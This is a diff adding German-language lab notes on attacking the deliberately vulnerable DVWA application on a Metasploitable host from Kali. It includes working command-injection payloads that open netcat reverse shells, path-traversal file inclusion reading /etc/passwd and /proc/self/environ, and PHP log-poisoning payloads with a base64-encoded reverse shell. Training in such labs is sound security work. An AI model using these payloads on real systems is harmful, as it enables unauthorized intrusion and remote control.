@@ -1,0 +1,157 @@
+
+
+
+
+sudo nano /var/www/multillidae
+    DB leeren 
+    und 
+
+sudo /etc/init.d/apache2 reload
+
+
+DVWA
+
+DVWA Security auf low stellen
+
+
+
+
+
+Auf Kali
+
+Schauen was auf dem webserver läuft
+
+nc -vv 10.10.10.103 80
+10.10.10.103: inverse host lookup failed: Unknown host
+(UNKNOWN) [10.10.10.103] 80 (http) open
+HEAD
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>400 Bad Request</title>
+</head><body>
+<h1>Bad Request</h1>
+<p>Your browser sent a request that this server could not understand.<br />
+</p>
+<hr>
+<address>Apache/2.2.8 (Ubuntu) DAV/2 Server at metasploitable.localdomain Port 80</address>
+</body></html>
+ sent 5, rcvd 323
+
+ nmap -n -Pn -v -sV --script=http-enum -p 80 10.10.10.103
+
+ Auf Web Applikation Firewall prüfen
+
+ wafw00f 10.10.10.103/dvwa
+
+ wafw00f 10.10.10.103
+
+Webanwendung auf gängige Fehler prüfen
+
+nikto -h 10.10.10.103
+
+######################
+# Command Execution  #
+######################
+
+
+in Kali listener starten
+nc -vv -l -p 8080
+
+im DVWA in Command Execution in das Ping Feld:
+
+; nc -e /bin/sh 10.10.10.108 8080
+
+auf medium stellen
+DVWA Security
+
+|| ls
+
+oder Verknüpfung wurde nicht auskomentiert
+
+|| nc -e /bin/sh 10.10.10.108 8080
+
+so funktioniert das selbe shell verknüpfung
+
+
+######################
+#   File Inclusion   #
+######################
+
+http://10.10.10.103/dvwa/vulnerabilities/fi/?page=include.php
+
+Achten auf
+?page=include.php
+
+http://10.10.10.103/dvwa/vulnerabilities/fi/include.php
+Fatal error: Call to undefined function dvwaExternalLinkUrlGet() in /var/www/dvwa/vulnerabilities/fi/include.php on line 15
+
+File inclusion ausnptzen
+
+mit /../../../../ ins ROOT-Verzeichnis
+mit /etc/passwd Datei passwd öffnen
+http://10.10.10.103/dvwa/vulnerabilities/fi/?page=/../../../../../etc/passwd
+
+
+http://10.10.10.103/dvwa/vulnerabilities/fi/?page=/../../../../../proc/self/environ
+
+Ausgabe:
+REDIRECT_HANDLER=php5-cgiREDIRECT_STATUS=200HTTP_HOST=10.10.10.103HTTP_USER_AGENT=Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5HTTP_ACCEPT_ENCODING=gzip, deflateHTTP_COOKIE=security=medium; PHPSESSID=ea1ebb99aecc64fcb7755850385e2183HTTP_CONNECTION=keep-aliveHTTP_UPGRADE_INSECURE_REQUESTS=1PATH=/usr/local/bin:/usr/bin:/binSERVER_SIGNATURE=
+Apache/2.2.8 (Ubuntu) DAV/2 Server at 10.10.10.103 Port 80
+SERVER_SOFTWARE=Apache/2.2.8 (Ubuntu) DAV/2SERVER_NAME=10.10.10.103SERVER_ADDR=10.10.10.103SERVER_PORT=80REMOTE_ADDR=10.10.10.108DOCUMENT_ROOT=/var/www/SERVER_ADMIN=webmaster@localhostSCRIPT_FILENAME=/usr/lib/cgi-bin/phpREMOTE_PORT=55286REDIRECT_QUERY_STRING=page=/../../../../../proc/self/environREDIRECT_URL=/dvwa/vulnerabilities/fi/index.phpGATEWAY_INTERFACE=CGI/1.1SERVER_PROTOCOL=HTTP/1.1REQUEST_METHOD=GETQUERY_STRING=page=/../../../../../proc/self/environREQUEST_URI=/dvwa/vulnerabilities/fi/?page=/../../../../../proc/self/environSCRIPT_NAME=/cgi-bin/phpPATH_INFO=/dvwa/vulnerabilities/fi/index.phpPATH_TRANSLATED=/var/www/dvwa/vulnerabilities/fi/index.php
+Warning: Cannot modify header information - headers already sent by (output started at /proc/5222/environ:1) in /var/www/dvwa/dvwa/includes/dvwaPage.inc.php on line 324
+
+Warning: Cannot modify header information - headers already sent by (output started at /proc/5222/environ:1) in /var/www/dvwa/dvwa/includes/dvwaPage.inc.php on line 325
+
+Warning: Cannot modify header information - headers already sent by (output started at /proc/5222/environ:1) in /var/www/dvwa/dvwa/includes/dvwaPage.inc.php on line 326
+
+Das interessante ist: 
+HTTP_USER_AGENT=Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+
+Der User Agent könnte man durch ein Php script ergänzt, ersetzt werden.
+Dadurch remote Shell möglich
+
+/../../../../../ wenn man so etwas in WAF sieht überprüfen, sperren usw.
+
+DVWA Security auf Medium stellen -> in DVWA Security
+
+burpsuit starten 
+
+in proxy Tab gehen
+
+In Firefox Advanced Networksettings Proxy au 127.0.0.1:8080
+
+Listner starten
+
+ nc -vv -l -p 443
+
+im burpsuit das Packet a
+
+<?shell_exec('nc -e /bin/sh 10.10.10.108 443');?>
+
+<?passthru("nc -e nc -e /bin/sh 10.10.10.108 443");?>
+
+
+Auch noch das Log ist anzeigbar.
+Wir wollen also eine Fehlermeldung in diesem File erzeugen welches per php ausführbar ist
+http://10.10.10.103/dvwa/vulnerabilities/fi/?page=../../../../../../var/log/auth.log
+
+
+Decoder in burp 
+nc -e /bin/sh 10.10.10.108 443
+als BASE64 codieren
+ergebnis:   bmMgLWUgL2Jpbi9zaCAxMC4xMC4xMC4xMDggNDQz
+
+ergebins hier anstelle von Base64CODE einfügen
+ssh "<?shell_exec(base64_decode('Base64CODE'));?>"@10.10.10.103
+
+Dieser Login versuch git ein Eintrag im /var/log/auth.log
+
+Auf dem Kali listener starten
+nc -vv -l -p 443
+
+erneut aufrufen
+http://10.10.10.103/dvwa/vulnerabilities/fi/?page=../../../../../../var/log/auth.log
+
+die reverse Shell soll nun offen sein
+
+
